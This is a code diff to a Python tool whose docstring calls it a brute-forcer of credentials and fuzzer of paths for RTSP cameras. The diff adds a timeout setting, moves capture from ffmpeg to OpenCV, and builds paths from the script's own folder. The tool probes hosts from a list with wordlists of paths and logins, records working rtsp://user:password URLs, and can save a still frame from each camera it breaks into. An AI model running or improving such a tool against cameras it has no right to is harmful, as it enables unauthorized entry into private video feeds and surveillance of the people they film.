@@ -3,6 +3,7 @@
 See --help for options"""
 from concurrent.futures import ThreadPoolExecutor as TPE
 from functools import partial
+import os
 import re
 import socket as so
 from time import sleep
@@ -19,9 +20,14 @@ rtsp_port = 554
 host_threads = 64
 path_threads = 2
 brute_threads = 1
+timeout = 5
 verbose = 0
 capture_image = False
 
+DIR = os.path.dirname(os.path.abspath(__file__))
+LOCAL_DIR = os.path.join(DIR, 'local')
+DATA_DIR = os.path.join(DIR, 'data')
+CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')
 
 # cam
 C_FOUND = '@'
@@ -44,24 +50,43 @@ C_CAP_ERR = '!'
 
 
 def capture(res):
-    import ffmpeg
-    scr = res.split('://')[1].replace('/', '-').replace(':', '_')
+    from re import sub
+    img_name = sub(r'[^A-Za-z0-9]+', '_', res.split('://')[1])
+    img_path = os.path.join(CAPTURES_DIR, f'{img_name}.jpg')
 
-    stream = ffmpeg.input(res, ss=0)
-    file = stream.output(f"local/{scr}.png", vframes=1)
     try:
-        file.run(capture_stdout=True, capture_stderr=True)
-    except ffmpeg.Error:
-        print(C_CAP_ERR, end='', flush=True)
-    else:
-        print(C_CAP_OK, end='', flush=True)
+        from cv2 import VideoCapture, imwrite
+        from numpy import ndarray
+        vcap = VideoCapture(res)
+        _, frame = vcap.read()
+        if type(frame) != ndarray:
+            return False
+        else:
+            imwrite(img_path, frame)
+            return True
+
+    except ImportError:
+        import ffmpeg
+
+        stream = ffmpeg.input(res, rtsp_transport='tcp')
+        file = stream.output(img_path, vframes=1)
+
+        try:
+            file.run(capture_stdout=True, capture_stderr=True)
+        except ffmpeg.Error as e:
+            print(e.stdout.decode())
+            print(e.stderr.decode())
+            return False
+        else:
+            return True
 
 
 def wrire_result(res: str):
-    with open('./local/rtsp.txt', 'a') as f:
+    with open(os.path.join(LOCAL_DIR, 'rtsp.txt'), 'a') as f:
         f.write(f'[{tim()}] {res}\n')
     if capture_image:
-        capture(res)
+        captured = capture(res)
+        print(C_CAP_OK if captured else C_CAP_ERR, end='', flush=True)
 
 
 def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 3):
@@ -127,7 +152,7 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
 
 
 def check_cred(host, port, path, cred):
-    code = rtsp_req(host, port, path, cred)
+    code = rtsp_req(host, port, path, cred, timeout)
     if code == 200:
         print(C_OK, end='', flush=True)
         return f'rtsp://{cred}@{host}:{port}{path}'
@@ -140,7 +165,7 @@ def check_cred(host, port, path, cred):
 
 
 def check_path(host, port, path):
-    code = rtsp_req(host, port, path)
+    code = rtsp_req(host, port, path, timeout=timeout)
 
     if code >= 500:
         print(C_FAIL, end='', flush=True)
@@ -151,7 +176,7 @@ def check_path(host, port, path):
             print('.', end='', flush=True)
         return ''
 
-    with open('./data/rtsp_creds.txt') as f:
+    with open(os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
         creds = [ln.rstrip() for ln in f]
 
     ch = partial(check_cred, host, port, path)
@@ -171,7 +196,7 @@ def check_host(host):
     ch = partial(check_path, host, int(port))
 
     with TPE(path_threads) as ex:
-        with open('./data/rtsp_paths.txt') as f:
+        with open(os.path.join(DATA_DIR, 'rtsp_paths.txt')) as f:
             paths = [ln.rstrip() for ln in f]
 
         for rr in ex.map(ch, paths):
@@ -183,12 +208,12 @@ def check_host(host):
                 return
 
             if rr:
-                wrire_result(rr)
                 print(C_FOUND, end='', flush=True)
+                wrire_result(rr)
                 return rr  # first valid path is enough now
 
 
-def main(hosts_file=None, port=554, ht=64, pt=2, bt=1, capture=False, v=False, vv=False, vvv=False):
+def main(hosts_file=None, port=554, t=5, ht=64, pt=2, bt=1, capture=False, v=False, vv=False, vvv=False):
     """Brute creds, fuzzing paths for RTSP cams
 
     :param str hosts_file: File with lines ip:port or just ips
@@ -203,17 +228,22 @@ def main(hosts_file=None, port=554, ht=64, pt=2, bt=1, capture=False, v=False, v
     global path_threads
     global brute_threads
     global capture_image
+    global timeout
 
     rtsp_port = port
     host_threads = ht
     path_threads = pt
     brute_threads = bt
     capture_image = capture
+    timeout = t
 
     verbose = 3 if vvv else 2 if vv else 1 if v else 0
 
+    if capture and not os.path.exists(CAPTURES_DIR):
+        os.mkdir(CAPTURES_DIR)
+
     if not hosts_file:
-        hosts_file = f'./local/hosts_{rtsp_port}.txt'
+        hosts_file = os.path.join(LOCAL_DIR, f'hosts_{rtsp_port}.txt')
 
     with open(hosts_file) as f:
         hosts = [ln.rstrip() for ln in f]
